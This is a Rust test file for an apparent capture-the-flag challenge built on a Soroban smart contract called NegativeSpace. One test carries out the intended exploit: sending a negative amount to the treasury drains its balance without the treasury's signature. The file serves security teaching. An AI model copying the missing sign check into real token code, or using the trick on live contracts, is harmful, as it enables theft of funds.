extern crate std;

use super::{Error, NegativeSpace, NegativeSpaceClient, TREASURY_BALANCE};
use soroban_sdk::{Address, Env, testutils::Address as _};

fn setup() -> (Env, NegativeSpaceClient<'static>, Address) {
    let env = Env::default();
    let player = Address::generate(&env);
    let issuer = Address::generate(&env);
    let token = env.register_stellar_asset_contract_v2(issuer).address();
    let id = env.register(NegativeSpace, (&player, &token));
    let client = NegativeSpaceClient::new(&env, &id);
    (env, client, player)
}

#[test]
fn starts_with_a_funded_treasury_and_an_empty_player() {
    let (_env, client, player) = setup();
    assert_eq!(client.balance(&client.address), TREASURY_BALANCE);
    assert_eq!(client.balance(&player), 0);
    assert!(!client.is_solved(&player));
}

#[test]
fn an_empty_account_cannot_send_a_positive_amount() {
    let (env, client, player) = setup();
    env.mock_all_auths();
    let other = Address::generate(&env);
    assert_eq!(
        client.try_send(&player, &other, &1),
        Err(Ok(Error::InsufficientBalance.into()))
    );
}

#[test]
fn send_requires_the_senders_signature() {
    let (env, client, player) = setup();
    let other = Address::generate(&env);
    assert!(client.try_send(&player, &other, &0).is_err());
}

/// The exploit: "send" a negative amount to the treasury. The balance check
/// passes (0 >= -1000), the sender gains 1000 and the treasury, which never
/// signed anything, loses it.
#[test]
fn exploit_send_a_negative_amount() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    client.send(&player, &client.address, &-TREASURY_BALANCE);

    let auths = env.auths();
    assert_eq!(auths.len(), 1);
    assert_eq!(auths[0].0, player);
    assert_eq!(client.balance(&client.address), 0);
    assert_eq!(client.balance(&player), TREASURY_BALANCE);
    assert!(client.is_solved(&player));
}

#[test]
fn a_partial_theft_is_not_enough() {
    let (env, client, player) = setup();
    env.mock_all_auths();
    client.send(&player, &client.address, &-(TREASURY_BALANCE - 1));
    assert!(!client.is_solved(&player));
}

#[test]
fn honest_transfers_still_work_once_funded() {
    let (env, client, player) = setup();
    env.mock_all_auths();
    let friend = Address::generate(&env);
    client.send(&player, &client.address, &-100);
    client.send(&player, &friend, &40);
    assert_eq!(client.balance(&player), 60);
    assert_eq!(client.balance(&friend), 40);
}

#[test]
fn only_the_owner_can_solve_their_instance() {
    let (env, client, _player) = setup();
    env.mock_all_auths();
    let other = Address::generate(&env);
    client.send(&other, &client.address, &-TREASURY_BALANCE);
    assert!(!client.is_solved(&other));
}
